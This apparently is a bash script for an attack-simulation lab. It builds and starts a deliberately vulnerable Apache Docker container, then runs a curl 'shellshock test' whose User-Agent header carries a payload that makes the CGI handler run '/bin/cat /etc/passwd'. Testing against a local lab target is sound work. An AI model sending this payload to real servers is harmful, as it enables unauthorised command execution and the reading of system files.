#!/bin/bash
# set -x

# +--------------------+
# GENERAL
# +--------------------+

## Installs dependencies for the attack simulation environment
## Tested on FRESH install of Kali Linux 2021.1.0 on 2/2021

# NOTE: This script is NOT guaranteed to work into the future
# (packages can be removed from package repositories)

# +--------------------+
# BREW INSTALLS
# +--------------------+

IMAGE_NAME=vulnerable-image
docker build -t "${IMAGE_NAME}" demo/

docker stop "${IMAGE_NAME}" || true
docker run -d --rm -p 80:80 --name "${IMAGE_NAME}" "${IMAGE_NAME}"

APACHE_IP="$(docker inspect --format '{{.NetworkSettings.IPAddress}}' ${IMAGE_NAME})"

# shellshock tests
curl -A \
    "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" \
    "https://${APACHE_IP}/cgi-bin/default.cgi"

